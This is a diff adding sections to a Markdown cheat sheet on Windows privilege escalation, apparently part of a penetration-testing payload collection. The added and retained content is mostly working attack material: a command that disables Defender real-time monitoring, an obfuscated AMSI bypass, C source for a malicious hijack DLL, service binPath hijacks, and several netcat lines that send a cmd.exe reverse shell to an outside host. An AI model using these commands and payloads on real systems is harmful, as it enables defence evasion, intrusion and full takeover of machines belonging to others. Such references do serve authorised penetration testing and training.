@@ -6,13 +6,17 @@
 * [Windows Version and Configuration](#windows-version-and-configuration)
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
-* [AppLocker Enumeration](#applocker-enumeration)
+* [Antivirus & Detections](#antivirus--detections)
+    * [Windows Defender](#windows-defender)
+    * [AppLocker Enumeration](#applocker-enumeration)
+    * [Powershell](#powershell)
+    * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
-    * [Passwords in unattend.xml](#passwords-in-unattend.xml)
+    * [Passwords in unattend.xml](#passwords-in-unattendxml)
     * [Wifi passwords](#wifi-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
     * [Powershell history](#powershell-history)
@@ -20,13 +24,16 @@
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
 * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
+* [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
   * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
   * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
   * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
@@ -112,6 +119,7 @@ List user privilege
 
 ```powershell
 whoami /priv
+whoami /groups
 ```
 
 List all users
@@ -219,10 +227,54 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
-## AppLocker Enumeration
+## Antivirus & Detections
+
+### Windows Defender
+
+```powershell
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable Real Time Monitoring
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+```
+
+### AppLocker Enumeration
 
 - With the GPO
 - HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+
+List AppLocker rules
+
+```powershell
+PS C:\> $a = Get-ApplockerPolicy -effective
+PS C:\> $a.rulecollections
+```
+
+### Powershell
+
+Default powershell locations in a Windows system.
+
+```powershell
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+
+Example of AMSI Bypass.
+
+```powershell
+PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+```
+
+
+### Default Writeable Folders
+
+```powershell
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
+```
 
 ## EoP - Looting for passwords
 
@@ -414,6 +466,7 @@ tasklist /v
 net start
 sc query
 Get-Service
+Get-Process
 Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
 ```
 
@@ -470,6 +523,26 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 Often, services are pointing to writeable locations:
 - Orphaned installs, not installed anymore but still exist in startup
 - DLL Hijacking
+    ```powershell
+    # find missing DLL 
+    - Find-PathDLLHijack PowerUp.ps1
+    - Process Monitor : check for "Name Not Found"
+
+    # compile a malicious dll
+    - For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+    - For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+
+    # content of windows_dll.c
+    #include <windows.h>
+    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+        if (dwReason == DLL_PROCESS_ATTACH) {
+            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+            ExitProcess(0);
+        }
+        return TRUE;
+    }
+    ```
+
 - PATH directories with weak permissions
 
 ```powershell
@@ -497,9 +570,9 @@ Prerequisite: Service account
 
 ```powershell
 PS C:\Windows\system32> sc.exe stop UsoSvc
-PS C:\Windows\system32> sc.exe config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\a.txt"
 PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe qc usosvc
 [SC] QueryServiceConfig SUCCESS
 
@@ -605,6 +678,13 @@ For `C:\Program Files\something\legit.exe`, Windows will try the following paths
 - `C:\Program.exe`
 - `C:\Program Files.exe`
 
+## EoP - Named Pipes
+
+1. Find named pipes: `[System.IO.Directory]::GetFiles("\\.\pipe\")`
+2. Check named pipes DACL: `pipesec.exe <named_pipe>`
+3. Reverse engineering software
+4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
+
 
 ## EoP - Kernel Exploitation
 
@@ -683,10 +763,25 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 ```powershell
-$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
-$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-$ computer = "<hostname>"
+$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+```
+
+## EoP - Abusing Shadow Copies
+
+If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
+
+```powershell
+# List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+  
+# List shadow copies using diskshadow
+diskshadow list shadows all
+  
+# Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
 ## EoP - From local administrator to NT SYSTEM
@@ -729,6 +824,37 @@ Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary bel
 |`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
 |`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
 
+### Restore A Service Account's Privileges
+
+> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.
+
+```powershell
+# https://github.com/itm4n/FullPowers
+
+c:\TOOLS>FullPowers
+[+] Started dummy thread with id 9976
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19041.84]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+
 
 ### Meterpreter getsystem and alternatives
 
@@ -765,7 +891,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ### Juicy Potato (abusing the golden privileges)
 
 Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809. 
+:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -950,3 +1076,4 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
 * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
+* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
